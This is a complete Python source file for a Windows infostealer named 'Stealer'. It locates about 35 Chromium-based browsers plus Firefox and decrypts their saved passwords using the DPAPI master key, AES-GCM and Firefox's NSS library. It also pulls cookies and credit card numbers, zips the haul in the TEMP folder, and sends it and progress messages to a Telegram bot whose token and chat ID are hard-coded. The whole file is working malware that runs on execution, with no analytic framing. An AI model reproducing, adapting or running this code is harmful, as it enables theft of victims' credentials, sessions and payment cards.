# -*- coding: utf-8 -*-
import traceback
import sys
import os
import json
import base64
import sqlite3
import win32crypt
import ctypes
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import getpass
import requests
from zipfile import ZipFile
class Stealer():
	def __init__(self):
		#try:
			self.token = "5226296304:AAFALU7Us4WnjEx4RbJsV1U3ZyhGiKYxKFo"
			self.chat_id = "5176730926"
			self.result = {}
			self.SendMessage("%F0%9F%93%8C Enumerating Chromium Data...")
			self.result.update(Chromium(self).Main())
			self.SendMessage("%F0%9F%93%8C Enumerating Firefox Data...")
			self.result.update(Firefox(self).Main())
			self.SendMessage("%F0%9F%93%8C Saveing...")
			self.Save(self.result)
			self.SendMessage("%F0%9F%93%8C Sending File...")
			self.Zip_Folder()
		#except:
		#	self.SendMessage("✖️ Stealer Error : \n ❖ Message : " + traceback.format_exc())
	def Zip_Folder(self):
		dirname = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + "\\"
		output = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + '.zip'
		file = ZipFile(output, 'w')
		for folderName, subfolders, filenames in os.walk(dirname):
			for filename in filenames:
				filePath = os.path.join(folderName, filename)
				file.write(filePath, "\\".join(filePath.split("\\")[-2:len(filePath.split("\\"))]))
		file.close()
		self.Send_File(output)
	def Save(self, result):
		dirname = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + "\\"
		if os.path.exists(dirname):
			shutil.rmtree(dirname,True)
		os.mkdir(dirname)
		# Save Passwords
		for browser in result.keys():
			outdir = dirname + browser + "\\"
			os.mkdir(outdir)
			if "Passwords" in result[browser].keys():
				filename = outdir + "Passwords.txt"
				file = open(filename,"w")
				for item in result[browser]["Passwords"]:
					try:
						url = str(item['URL'])
					except:
						url = ""
					try:
						username = str(item['Username'])
					except:
						username = ""
					try:
						password = str(item['Password'])
					except:
						password = ""
					file.write("URL : " + url + "\n")
					file.write("Username : " + username + "\n")
					file.write("Password : " + password + "\n\n")
			if "Cookies" in result[browser].keys():
				filename = outdir + "Cookies.txt"
				file = open(filename,"w")
				file.write(json.dumps(result[browser]["Cookies"]))
				file.close()
			if "Credit Cards" in result[browser].keys():
				filename = outdir + "Credit Cards.txt"
				file = open(filename,"w")
				for item in result[browser]["Credit Cards"]:
					try:
						number = str(item['Number'])
					except:
						number = ""
					try:
						year = str(item['Year'])
					except:
						year = ""
					try:
						month = str(item['Month'])
					except:
						month = ""
					try:
						name = str(item['Name'])
					except:
						name = ""
					file.write("Name : " + name + "\n")
					file.write("Number : " + number + "\n")
					file.write("Year : " + year + "\n")
					file.write("Month : " + month + "\n\n")
				file.close()
	def Request(self,url):
		return requests.get(url).text.encode("utf-8")
	def Send_File(self,filename):
		url = "https://api.telegram.org/bot" + self.token + "/sendDocument?caption=--" + getpass.getuser() + "--&chat_id=" + self.chat_id
		requests.get(url, files={'document':open(filename,'rb')})
	def SendMessage(self,message):
		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)

class Chromium():
	def __init__(self,main_self):
		self.main_self = main_self
		self.browsers = {
			"Chrome" : r"AppData\Local\Google\Chrome\User Data\Default",
			"Edge Chromium" :  r"AppData\Local\Microsoft\Edge\User Data\Default",
			"Opera" : r"AppData\Roaming\Opera Software\Opera Stable",
			"Opera GX" : r"AppData\Roaming\Opera Software\Opera GX Stable",
			"Chromium" : r"AppData\Local\Chromium\User Data\Default",
			"Yandex" : r"AppData\Local\Yandex\YandexBrowser\User Data\Default",
			"360 Browser" : r"AppData\Local\360Chrome\Chrome\User Data\Default",
			"Comodo Dragon" : r"AppData\Local\Comodo\Dragon\User Data\Default",
			"CoolNovo" : r"AppData\Local\MapleStudio\ChromePlus\User Data\Default",
			"Torch Browser" : r"AppData\Local\Torch\User Data\Default",
			"Brave Browser" : r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default",
			"Iridium Browser" : r"AppData\Local\Iridium\User Data\Default",
			"7Star" : r"AppData\Local\7Star\7Star\User Data\Default",
			"Amigo" : r"AppData\Local\Amigo\User Data\Default",
			"CentBrowser" : r"AppData\Local\CentBrowser\User Data\Default",
			"Chedot" : r"AppData\Local\Chedot\User Data\Default",
			"CocCoc" : r"AppData\Local\CocCoc\Browser\User Data\Default",
			"Elements Browser" : r"AppData\Local\Elements Browser\User Data\Default",
			"Epic Privacy Browser" : r"AppData\Local\Epic Privacy Browser\User Data\Default",
			"Kometa" : r"AppData\Local\Kometa\User Data\Default",
			"K-Melon" : r"AppData\Local\K-Melon\User Data\Default",
			"360Browser" : r"AppData\Local\360Browser\Browser\User Data\Default",
			"Nichrome" : r"AppData\Local\Nichrome\User Data\Default",
			"Orbitum" : r"AppData\Local\Orbitum\User Data\Default",
			"Maxthon3" : r"AppData\Local\Maxthon3\User Data\Default",
			"Sputnik" : r"AppData\Local\Sputnik\Sputnik\User Data\Default",
			"Chromodo" : r"AppData\Local\Chromodo\User Data\Default",
			"uCozMedia" : r"AppData\Local\uCozMedia\Uran\User Data\Default",
			"Vivaldi" : r"AppData\Local\Vivaldi\User Data\Default",
			"Sleipnir 6" : r"AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer",
			"Citrio" : r"AppData\Local\CatalinaGroup\Citrio\User Data\Default",
			"Coowon" : r"AppData\Local\Coowon\Coowon\User Data\Default",
			"Liebao Browser" : r"AppData\Local\liebao\User Data\Default",
			"QIP Surf" : r"AppData\Local\QIP Surf\User Data\Default",
		}
		self.json = {}
	def Main(self):
		
		# Enumerate Passwords
		self.Passwords()
		self.Cookies()
		self.Credit_Cards()
		# Return Json
		return self.json

	# Enumerate Passwords
	def Passwords(self):
		for browser in self.browsers.keys():
			filename = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
			if os.path.exists(filename):
				master_key = self.get_master_key(filename)
				if master_key == None:
					continue
				login_db = filename + r'\Login Data'
				if os.path.exists(login_db):
					shutil.copy2(login_db, os.environ['TEMP'] + "\\" + "Database.db")
					conn = sqlite3.connect(os.environ['TEMP'] + "\\" + "Database.db")
					cursor = conn.cursor()
					result = []
					try:
						cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
						for r in cursor.fetchall():
							url = r[0]
							username = r[1]
							encrypted_password = r[2]
							decrypted_password = self.decrypt_password(encrypted_password, master_key)
							if username != "" or decrypted_password != "":
								data = {}
								data['URL'] = url
								data['Username'] = username
								data['Password'] = decrypted_password
								result.append(data)
					except Exception as e:
						pass
					cursor.close()
					conn.close()
					if result:
						if browser not in self.json.keys():
							self.json[browser] = {}
						self.json[browser].update({'Passwords' : result})
					try:
						os.remove(os.environ['TEMP'] + "\\" + "Database.db")
					except Exception as e:
						pass
	# Enumerate Cookies
	def Cookies(self):
		for browser in self.browsers.keys():
			dirname = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
			if os.path.exists(dirname):
				master_key = self.get_master_key(dirname)
				if master_key == None:
					continue
				if os.path.exists(dirname + r'\Cookies'):
					cookies_db = dirname + r'\Cookies'
				elif os.path.exists(dirname + r'\Network\Cookies'):
					cookies_db = dirname + r'\Network\Cookies'
				else:
					continue
				if True:
					shutil.copy2(cookies_db,os.environ['TEMP'] + "\\" + "Database.db")
					conn = sqlite3.connect(os.environ['TEMP'] + "\\" + "Database.db")
					conn.text_factory = bytes
					cursor = conn.cursor()
					result = []
					try:
						cursor.execute("SELECT host_key, path, is_secure, last_access_utc, name, encrypted_value, is_persistent, is_httponly FROM cookies")
						for r in cursor.fetchall():
							decrypted_password = self.decrypt_password(r[5], master_key)
							data = {}
							data['domain'] = r[0]
							data['path'] = r[1]
							data['secure'] = bool(int(r[2]))
							data['expirationDate'] = r[3]
							data['name'] = r[4]
							data['value'] = decrypted_password
							data['storeId'] = str(0)
							data['httpOnly'] = bool(r[-7])
							result.append(data)
					except Exception as e:
						pass
					cursor.close()
					conn.close()
					if browser not in self.json.keys():
						self.json[browser] = {}
					self.json[browser].update({'Cookies': result})
					try:
						os.remove(os.environ['TEMP'] + "\\" + "Database.db")
					except Exception as e:
						pass
	# Enumerate Credit Cards
	def Credit_Cards(self):
		for browser in self.browsers.keys():
			dirname = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
			if os.path.exists(dirname):
				master_key = self.get_master_key(dirname)
				if master_key == None:
					continue
				database = dirname + r'\Web Data'
				if os.path.exists(database):
					shutil.copy2(database,os.environ['TEMP'] + "\\" + "Database.db")
					conn = sqlite3.connect(os.environ['TEMP'] + "\\" + "Database.db")
					cursor = conn.cursor()
					result = []
					try:
						cursor.execute("SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards")
						for r in cursor.fetchall():
							data = {}
							data['Number'] = self.decrypt_password(r[0], master_key)
							data['Year'] = r[1]
							data['Month'] = r[2]
							data['Name'] = r[3]
							result.append(data)
					except Exception as e:
						pass
					cursor.close()
					conn.close()
					if browser not in self.json.keys():
						self.json[browser] = {}
					if result:
						self.json[browser].update({'Credit Cards': result})
					try:
						os.remove(os.environ['TEMP'] + "\\" + "Database.db")
					except Exception as e:
						pass
	def decrypt_password(self, buff, master_key):
		try:
			iv = buff[3:15]
			payload = buff[15:]
			cipher = AES.new(master_key, AES.MODE_GCM, iv)
			decrypted_pass = cipher.decrypt(payload)
			decrypted_pass = decrypted_pass[:-16].decode()
			return decrypted_pass
		except:
			pass

	def get_master_key(self,dir):
		dirs = [dir ,"\\".join(dir.split("\\")[0:-1])]
		found = True
		for i in dirs:
			if os.path.exists(i + r"\Local State"):
				file = open(i + r"\Local State","r")
				local_state = json.loads(file.read())
				try:
					master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
					master_key = master_key[5:]
					master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
					return master_key
				except:
					pass
		#self.main_self.SendMessage("✖️ Stealer Error : \n ❖ Failed Enumerate Master Key : " + dir)
		return None
class Firefox():
	def __init__(self, main_self):
		self.main_self = main_self
		self.browsers = {
			"Firefox" : r"AppData\Roaming\Mozilla\Firefox\Profiles"
			}
		self.json = {}
	def Main(self):
		self.Passwords()
		self.Cookies()
		return self.json
	def Cookies(self):
		for browser in self.browsers.keys():
			dirname = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
			profiles = self.Enumerate_Profiles(dirname)
			for profile in profiles:
				cookies_db = profile + r'\cookies.sqlite'
				if os.path.exists(cookies_db):
					shutil.copy2(cookies_db,os.environ['TEMP'] + "\\" + "Database.db")
					conn = sqlite3.connect(os.environ['TEMP'] + "\\" + "Database.db")
					cursor = conn.cursor()
					result = []
					cursor.execute("SELECT host, path, isSecure, lastAccessed, name, value, isHttpOnly FROM moz_cookies")
					for r in cursor.fetchall():
						data = {}
						data['domain'] = r[0]
						data['path'] = r[1]
						data['secure'] = bool(int(r[2]))
						data['expirationDate'] = r[3]
						data['name'] = r[4]
						data['value'] = r[5]
						data['httpOnly'] = bool(r[6])
						data['storeId'] = str(1)
						result.append(data)
					cursor.close()
					conn.close()
					if browser not in self.json.keys():
						self.json[browser] = {}
					self.json[browser].update({'Cookies': result})
					try:
						os.remove(os.environ['TEMP'] + "\\" + "Database.db")
					except Exception as e:
						pass
	def Passwords(self):
		try:
			firefox_path = r"C:\Program Files\Mozilla Firefox"
			self.nss3 = CDLLEx(os.path.join(firefox_path, 'nss3.dll'), 0x00000008)
			self.nss3.PK11SDR_Decrypt.restype = ctypes.c_int
			self.nss3.PK11SDR_Decrypt.argtypes = (ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p)
			for browser in self.browsers.keys():
				dirname = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
				profiles = self.Enumerate_Profiles(dirname)
				result = []
				for i in profiles:
					encprof = i.encode("utf8")
					init = self.nss3.NSS_Init(b"sql:" + encprof)
					file = open(i + r"\logins.json","r")
					read = file.read()
					file.close()
					data = json.loads(read)
					result = []
					for i in data['logins']:
						data = {}
						data['URL'] = i['hostname']
						data['Username'] = self.Decrypt(i['encryptedUsername'])
						data['Password'] = self.Decrypt(i['encryptedPassword'])
						result.append(data)
					if result:
						if browser not in self.json.keys():
							self.json[browser] = {}
						self.json[browser].update({'Passwords' : result})
		except Exception as ex:
			self.main_self.SendMessage("✖️ Stealer Error : \n ❖ " + str(ex))
	def Enumerate_Profiles(self, folder):
		profiles = []
		if os.path.exists(folder):
			files = os.listdir(folder)
			profiles = [os.path.join(folder, f) for f in files if os.path.isfile(os.path.join(folder, f, "logins.json"))]
		return profiles

	def getfunc(self, restype, name, *argtypes):
		res = getattr(self.nss3, name)
		res.restype = restype
		res.argtypes = argtypes
		return res
	def Decrypt(self, value):
		data = base64.b64decode(value)
		out = SECItem(0, None, 0)
		inp = SECItem(0, data, len(data))
		fpPk11SdrDecrypt = self.nss3.PK11SDR_Decrypt(inp, out, None)
		result = ctypes.string_at(out.data, out.len).decode("utf8")
		return result
class SECItem(ctypes.Structure):
    _fields_ = [
        ('type', ctypes.c_uint),
        ('data', ctypes.c_char_p),
        ('len', ctypes.c_uint),
    ]
class PK11SlotInfo(ctypes.Structure):
    pass
from ctypes import wintypes
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
kernel32.LoadLibraryExW.restype = wintypes.HMODULE
kernel32.LoadLibraryExW.argtypes = (wintypes.LPCWSTR,wintypes.HANDLE,wintypes.DWORD)
class CDLLEx(ctypes.CDLL):
	def __init__(self, name, mode=0, handle=None, use_errno=True, use_last_error=False):
		if os.name == 'nt' and handle is None:
			handle = kernel32.LoadLibraryExW(name, None, mode)
		super(CDLLEx, self).__init__(name, mode, handle,use_errno, use_last_error)
class WinDLLEx(ctypes.WinDLL):
	def __init__(self, name, mode=0, handle=None, use_errno=False, use_last_error=True):
		if os.name == 'nt' and handle is None:
			handle = kernel32.LoadLibraryExW(name, None, mode)
		super(WinDLLEx, self).__init__(name, mode, handle,use_errno, use_last_error)

Stealer()
